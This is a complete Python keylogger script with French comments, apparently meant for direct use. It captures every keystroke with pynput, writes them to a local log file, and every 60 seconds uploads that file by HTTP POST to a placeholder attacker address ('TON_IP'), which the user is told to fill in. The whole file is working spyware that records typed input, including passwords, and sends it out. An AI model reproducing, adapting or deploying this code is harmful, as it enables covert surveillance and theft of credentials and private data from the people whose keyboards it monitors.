import pynput.keyboard
import threading
import time
import requests

log_file = "log.txt"
interval = 60  # temps entre chaque envoi en secondes
url = "http://TON_IP:8000"  # change TON_IP

# Fonction de logging
def enregistrer_touche(touche):
    with open(log_file, "a") as fichier:
        try:
            fichier.write(touche.char)
        except:
            fichier.write(f"[{touche}]")

# Fonction d'envoi
def envoyer_log():
    while True:
        try:
            with open(log_file, "rb") as f:
                requests.post(url, files={"file": f})
        except:
            pass
        time.sleep(interval)

# Lancer l'écoute du clavier
listener = pynput.keyboard.Listener(on_press=enregistrer_touche)
listener.start()

# Lancer l'envoi en thread
threading.Thread(target=envoyer_log).start()

listener.join()

